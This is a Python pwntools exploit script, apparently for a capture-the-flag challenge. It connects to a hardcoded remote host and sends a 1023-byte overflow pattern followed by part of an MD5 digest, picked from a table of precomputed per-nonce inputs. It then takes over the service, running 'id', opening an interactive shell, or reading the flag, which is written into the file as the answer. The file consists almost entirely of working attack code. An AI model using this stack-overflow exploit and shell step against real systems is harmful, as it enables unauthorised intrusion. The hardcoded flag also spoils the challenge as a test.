#!/usr/bin/env python2

from pwn import *
import md5
import sys

HOST = '34.246.96.248'
PORT = 24680
FLAG = 'midnight{h@$h_th3_st4ck_f0r_fun_4nd_pr0f1t}'

inputs = [
	'745204348956863686',   '2044300591507556631',  '1798106980592712414',  '795021949854516045',
	'2091231468391040784',  '12583519827312623',	'347454245244118981',   '1790481491379793319',
	'1885141523211373336',  '4955337691438022346',  '1854119442630995609',  '20935069992101374812',
	'12069398331375363661', '13264842451421655039', '20469089561645803942', '1936941055536825123',
	'885605503493835040',   '11566262431300905418',	'1736307536737751699',  '1661859712717966610',
	'20016658951483018333', '20725311672039845513', '872653530954042370',   '9833044341229261941',
	'1031326246153829942',  '41828840823170696',    '15880670738683658',    '17185498952034417460',
	'3815259881860778818',  '12528977341322318130',	'27907002395836133',    '15543551121702849148',
	'701278107336409061',   '64777444077321315',    '7060483551825053424',  '778733121278653916',
	'1263322381669908068',  '13740979191228430076', '13293621771561595952', '6605637881117687573',
	'349640126812968953',   '13501800431064505253', '715131535690817260',   '238630654422743727',
	'1338989577980978223',  '632532966495257125',   '16232514591598416017', '12871954381395380203',
	'317762630471690058',   '200646142613506192',   '1177233127508527293',  '2343748092092471422',
	'3495667432079030642',  '18793674572080076452', '580140238494254225',   '19626028331653181075',
	'19035602762002239438', '469754214152961133',   '1745586067826151172',  '2031595406966215878',
	'2074610748222571583',  '474691358685536034',   '162163307766270820',   '1190658408930330568',
	'248234275983813046',   '3113817711355945753',  '11600869991993319691', '14450237068541889',
	'2287995171667035066',  '1113839522776924139',  '12615026111975422932', '1127862285352177790',
	'20041952141973855736', '1704653453311283691',  '11062755601898055559', '8056799671397859651',
	'776695172010565040',   '318093598260673348',   '1911576055868382835',  '1495755867573284312',
	'521326853661534192',   '183169388046874627',   '573785201160573014',   '15988098181314917371',
	'3544070801801320708',  '1605867019718593188',  '1912094169573431574',  '526924017747299453',
	'17734656571377251257', '1852764671541248682',  '3763382802138390021',  '637751967364959804',
	'8508491762023042716',  '721405840234203526',   '1173217697793833852',  '14258523371286248319',
	'18511233761248798166', '775850777689747132',   '19189900971978511023', '100556093502954768',
	'4754050621022839018',  '8000551441791668970',  '4575266611807709983',  '9394850302101109098',
	'17836789211028005065', '290713033544388726',   '19527162541337088994', '1444268608669508292',
	'10032687871737247569', '1815714668898766064',  '1295903429464259686',  '309904880501378760',
	'17592008811129877435', '661984251233183480',   '666349536100653946',   '19528264231728464043',
	'13774324081994967942', '5937902462123767862',  '920928138331126273',   '2071662026941999477',
	'333835149744296408',   '125117514614735126',   '1418156479102933983',  '1796455182121385316',
	'789634893762625244',   '244461738613153368',   '1608011124246705544',  '598478583153128384',
	'18290748651740702284', '11040156442104886048', '1476354428777248865',  '2131196954603020488',
	'2135428068645550279',  '1550260568569068111',  '1150327434932303202',  '566284267627735007',
	'19162204461215907049', '448812572866355673',   '1108917118660899114',  '1179378353601280039',
	'1721010091237421477',  '6564179929486111',     '11916904921454944628', '7688227971558559355',
	'101174524730622289',   '18581672151774314340', '819856978165479227',   '14749099541147599341',
	'612262127874986654',   '17542931401548053973', '1806063130786327682',  '312114581009589416',
	'12963830241019167443', '21371494031614026755', '7169206161289553633',  '5887461691000592964',
	'2795898971301820699',  '18548369401971585324', '19194743551971384175', '17346472132099912512',
	'16069397591675571705', '10886548061072943839', '1291228930469099122',  '1234455202510528966',
	'1555530641338326517',  '21292396321182164036', '1303628021248485067',  '6826027581601090133',
	'1466501251705907',     '20850190492105130853', '913029004351371791',   '571013528152578241',
	'1640198298346103362',  '19690655261143445428', '13099665051700556615', '1364368538909937008',
	'4386821041220535787',  '62332639836389681',    '4044546201314479471',  '2175693481347299824',
	'326129693478708159',   '639944566945014136',   '10682739001283776186', '882913642544330298',
	'3825051961544008918',  '8117846411625685373',  '13856215821293533337', '11063282801194425290',
	'1471035334978092072',  '21246366671216919387', '821110635635969941',   '20284476232124506467',
	'15840795791423960354', '4305881351980149420',  '13972657241902309145', '1384196858524868184',
	'1571031800279883402',  '3096800151293673962',  '861601483157008703',   '84764185721655361',
	'8665252351145351510',  '17844231421078740856', '1825296779428498539',  '494579753572666872',
	'20342806861394691878', '1587973812334038627',  '838893519519474144',   '19692637731148257380',
	'8728147391620731286',  '1840453497235755802',  '5954213382136519153',  '11131280421711606955',
	'1925338794938519238',  '3038442041382348964',  '12288007991360052020', '4383063561492324288',
	'27514670904052959',    '7891326591675936867',  '1628142705948730853',  '1730530260601008343',
	'170645723776854299',   '1100920448111465317',  '179244096795140083',   '32504566578913335',
	'12220718651520263386', '437881732200010988',   '6397753981267559908',  '17049455281777043954',
	'753323469292680524',   '6605006421425257508',  '20869612691421109439', '15529615421433858659',
	'11996696791137686512', '10473099801589331504', '11201026421652765628', '1313887031942008838',
	'1136344881654410626',  '2129324591152683518',  '10028430071632943262', '4265430351776166271',
	'149193381371059692',   '7288394301229663029',  '959822585979950544',   '2078867296905771844',
	'8631914441623807312',  '6397881311697772526',  '11515477151780727597', '17188371501581741655',
	'1662688485279223263',  '4885632731087028649',  '29356425148645841',    '105029969552744983',
	'7330610182001799212',  '10126031401338286781', '199987118730462398',   '6803036872034129791',
]

def digest(nonce, data):
	m = md5.new()
	m.update(chr(nonce)+data)

	return m.digest()

DEBUG = False
NONCE = '\x1b[1mnonce:\x1b[0m '
INPUT = '\x1b[1minput:\x1b[0m '

host = HOST
if len(sys.argv) > 1:
	host = sys.argv[1]

port = PORT
if len(sys.argv) > 2:
	port = sys.argv[2]

if len(sys.argv) > 3:
	DEBUG = True

io = remote(host, port)

io.recvuntil(NONCE)
nonce = int(io.recvn(4), 16)

if DEBUG == True:
	log.info('nonce: 0x%02x' % nonce)

if nonce < len(inputs):

	digest = digest(nonce, inputs[nonce])

	io.recvuntil(INPUT)
	io.sendline(cyclic(1023)+digest[:4])

	for i in range(0, 32):

		io.recvuntil(INPUT)
		io.sendline('a')

	io.recvuntil(INPUT)
	io.sendline(inputs[nonce])

	io.sendline('')
	io.recvuntil('...\n')

	if DEBUG == True:
		log.success('got shell?')
		io.sendline('id')
		io.info(io.recvline().strip())

		io.interactive()

	else:

		io.sendline('cat flag')
		if io.recvline().strip() != FLAG:
			log.failure('fail')
			sys.exit(-1)
		else:
			log.success('pass')

	sys.exit(0)

else:
	io.close()
